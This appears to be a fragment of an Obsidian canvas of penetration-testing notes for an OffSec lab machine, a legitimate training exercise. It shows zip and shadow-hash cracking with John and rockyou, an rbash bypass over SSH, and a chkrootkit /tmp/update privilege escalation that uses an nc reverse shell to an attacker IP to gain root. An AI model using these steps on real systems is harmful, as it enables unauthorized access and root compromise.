		{"id":"4d80d133c5f90adb","type":"text","text":"## Enumerate honeypot.decoy Binary\n```bash\n./honeypot.decoy\n```\nMenu options:\n1. Date  2. Calendar  3. Shutdown  4. Reboot\n**5. Launch an AV Scan**  ← key lead\n6. Check /etc/passwd  7. Leave a note  8. Service status\n","x":2600,"y":420,"width":460,"height":310,"color":"1"},
		{"id":"a87e0ba3ef221015","type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260728140830.png","x":3300,"y":680,"width":917,"height":200},
		{"id":"ffa99b3427e136a1","type":"text","text":"```\n┌──(kali㉿kali)-[/tmp]\n└─$ cat 33899.txt \nWe just found a serious vulnerability in the chkrootkit package, which\nmay allow local attackers to gain root access to a box in certain\nconfigurations (/tmp not mounted noexec).\n\nThe vulnerability is located in the function slapper() in the\nshellscript chkrootkit:\n\n#\n# SLAPPER.{A,B,C,D} and the multi-platform variant\n\n```","x":3360,"y":1062,"width":720,"height":367},
		{"id":"2b1bdc1ebfe0fac9","type":"text","text":"### nmap\n```python\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\n| ssh-hostkey: \n|   2048 a9:b5:3e:3b:e3:74:e4:ff:b6:d5:9f:f1:81:e7:a4:4f (RSA)\n|   256 ce:f3:b3:e7:0e:90:e2:64:ac:8d:87:0f:15:88:aa:5f (ECDSA)\n|_  256 66:a9:80:91:f3:d8:4b:0a:69:b0:00:22:9f:3c:4c:5a (ED25519)\n80/tcp open  http    Apache httpd 2.4.38\n|_http-server-header: Apache/2.4.38 (Debian)\n| http-methods: \n|_  Supported Methods: GET POST OPTIONS HEAD\n| http-ls: Volume /\n| SIZE  TIME              FILENAME\n| 3.0K  2020-07-07 16:36  save.zip\n|_\n|_http-title: Index of /\nService Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\n```","x":-920,"y":300,"width":846,"height":534},
		{"id":"90a1b5874f659bbd","type":"text","text":"# TARGET","x":-160,"y":72,"width":250,"height":60},
		{"id":"0392ea0dbe81d07a","type":"text","text":"## Loot Collection\n**File found:** `/tmp/save.zip`\n\n### Crack zip password\n```bash\nzip2john save.zip > hash.txt\njohn --wordlist=/usr/share/wordlists/rockyou.txt hash.txt\njohn --show hash.txt\n```\n**Result:** zip password = `manuel`\n\n### Extract archive\n```bash\nunzip save.zip\n```\nContents: `etc/passwd`, `etc/shadow`, `etc/group`, `etc/sudoers`, `etc/hosts`, `etc/hostname`\n\n> 💡 Lesson: PKZIP encryption hashes crack via `zip2john`; format is `$pkzip$...`","x":1240,"y":-241,"width":420,"height":662,"color":"1"},
		{"id":"94f77e4917db953d","type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260728131810.png","x":700,"y":243,"width":400,"height":178},
		{"id":"f54fe97e18e168a6","type":"text","text":"##  Crack Linux Password Hashes\n### Unshadow\n```bash\nunshadow etc/passwd etc/shadow > linux_hashes.txt\n```\n\n### Hash format identified\n`$6$salt$hash` → **sha512crypt**\n- NOT raw SHA-512 (not 128 hex chars)\n- Salted + 5000 rounds, base64 output\n- hashcat mode `-m 1800` / john format `sha512crypt`\n### Crack\n```bash\njohn --wordlist=/usr/share/wordlists/rockyou.txt linux_hashes.txt\njohn --show linux_hashes.txt\n```\n**Result:**\n```\nuser: 296640a3b825115a47b68fc44501c828\npass: server\nshell: /bin/rbash\n```\n","x":1980,"y":-319,"width":420,"height":819,"color":"1"},
		{"id":"5c08e18cde5e4316","type":"text","text":"\n```bash\nssh 296640a3b825115a47b68fc44501c828@192.168.139.85 -t \"bash --noprofile\"\n```\n","x":2600,"y":11,"width":460,"height":160,"color":"#5b8f62"},
		{"id":"e9505ef9cba124bb","type":"text","text":"## Reverse Shell\n**On Kali (listener):**\n```bash\nnc -lvnp 4444\n```\n\n**On target:**\n```bash\ncd /tmp\necho '/usr/bin/nc 192.168.45.249 4444 -e /bin/sh' > /tmp/update\nchmod +x /tmp/update\n\ncd /home/296640a3b825115a47b68fc44501c828\n./honeypot.decoy   # select 5\n```\n\n**Result:** root shell lands on Kali listener\n```bash\nid   # uid=0(root)\n```\n","x":2620,"y":961,"width":420,"height":570,"color":"3"},
